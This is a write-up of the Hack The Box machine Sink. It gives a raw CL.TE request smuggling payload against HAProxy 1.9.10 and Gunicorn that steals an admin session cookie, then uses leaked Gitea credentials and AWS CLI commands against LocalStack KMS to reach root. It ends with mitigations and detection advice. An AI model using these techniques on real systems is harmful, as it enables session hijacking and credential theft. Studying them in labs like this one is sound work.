---
machine: Sink
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, http-smuggling, haproxy, gunicorn, gitea, aws, localstack, kms]
---

# Sink — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Three very different layers. A **CL.TE HTTP request smuggling** between **HAProxy 1.9.10** (CVE-2019-18277) and **Gunicorn 20.0.0** steals the administrator's session on a notes app; from there you reach **Gitea 1.12.6**, whose commit history holds an SSH key and **AWS** credentials. Those credentials point at a **LocalStack** with Secrets Manager, CloudWatch Logs and KMS: the logs leak a secret and KMS decrypts the file that yields root.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH
3000/tcp  http  Gitea 1.12.6
5000/tcp  http  notes app (HAProxy 1.9.10 → Gunicorn 20.0.0)
```

`curl -sI http://<IP>:5000/` returns `Server: gunicorn/20.0.0` and `Via: haproxy`: two servers that parse differently, the precondition for smuggling. Port 3000 runs Gitea with a `root` user who owns repositories.

## Enumeration

- The app on 5000 allows registration and **comments**; the comment is reflected on the page, which is what turns the administrator's request into readable data.
- A malformed request to the proxy leaks its exact version in the error headers: **HAProxy 1.9.10**.
- In Gitea, `root`'s repositories carry commits with files that should not be there (`Key_Management`, `Log_Management`).

## Foothold: CL.TE with an obfuscated `Transfer-Encoding`

HAProxy 1.9.10 honours `Content-Length` and **ignores** a `Transfer-Encoding: chunked` that arrives obfuscated; Gunicorn does the opposite and treats it as chunked. A single **vertical tab byte (0x0B)** before `chunked` is enough:

```http
POST /comment HTTP/1.1
Host: <IP>:5000
Content-Length: 4
Transfer-Encoding: chunked

1c
note=test
0


POST /comment HTTP/1.1
Host: <IP>:5000
Content-Length: 60

note=
```

The first body ends where HAProxy believes the request ends; Gunicorn keeps reading and takes the rest as a **new request**. When the administrator sends theirs on the same connection, the `Cookie: session=...` header gets glued to the `note=` parameter and shows up in the comments.

```text
Cookie: session=<admin session>
```

Swap the cookie in the browser and you are `admin@sink.htb`.

## Lateral movement

- **Admin panel → Gitea**: the administrator's private notes hold cleartext credentials (Chef, dev node, Nagios); the dev-node one opens the **Gitea** on 3000.
- **Gitea → SSH**: `root/Key_Management` has a commit with a private key; it belongs to `marcus` and grants host access.
- **Gitea → AWS**: `root/Log_Management` has a commit with `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`. Secrets in history survive file deletion: `git log --all` finds them.

## Privilege escalation

Those credentials target a **LocalStack** emulating AWS on the box itself:

```bash
aws configure set aws_access_key_id <AKIA...>
aws configure set aws_secret_access_key <secret>
aws --endpoint-url=http://<IP>:4566 secretsmanager list-secrets
aws --endpoint-url=http://<IP>:4566 logs describe-log-groups
```

- **CloudWatch Logs** holds application traces with secret values in clear text: that yields another user's password.
- **Secrets Manager** stores root's secret, but encrypted with a **CMK**; without `kms:Decrypt` it is useless.
- `kms decrypt` on the blob (with the right `encryption-context`) returns the plaintext: root's password on the host.

```bash
aws --endpoint-url=http://<IP>:4566 kms decrypt \
  --ciphertext-blob fileb://secret.bin --output text --query Plaintext | base64 -d
```

## Evidence (redacted)

```text
/home/marcus/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lessons

- Smuggling needs no exotic payload: it is enough that proxy and backend disagree on `Content-Length` versus `Transfer-Encoding`.
- Obfuscating the header (0x0B before `chunked`) is what makes the proxy ignore it and the backend accept it.
- Secrets in git history survive deletion: `git log --all` finds them.
- In the cloud, `secretsmanager:GetSecretValue` without `kms:Decrypt` is worth nothing; escalation is the sum of both.
- Logs are an accidental secret store: review what gets written to CloudWatch.

## Mitigations and detection

- Reject requests carrying both `Content-Length` and `Transfer-Encoding`, and normalise headers at the proxy (upgrade HAProxy ≥ 2.0.6).
- Secret scanning in CI and across git history; per-service IAM keys with least privilege.
- Encrypt secrets with KMS and separate who may read them from who may decrypt them; never dump values into logs.
- Detection: requests with obfuscated `Transfer-Encoding`, `Via: haproxy` with mismatched bodies, and `kms:Decrypt` from an instance that does not need it.

## References

- [CVE-2019-18277 — HAProxy request smuggling](https://nvd.nist.gov/vuln/detail/CVE-2019-18277)
- [HAProxy — request smuggling and `Transfer-Encoding`](https://www.haproxy.com/blog/haproxy-and-request-smuggling)
- [Hack The Box — Sink](https://www.hackthebox.com/machines/sink)
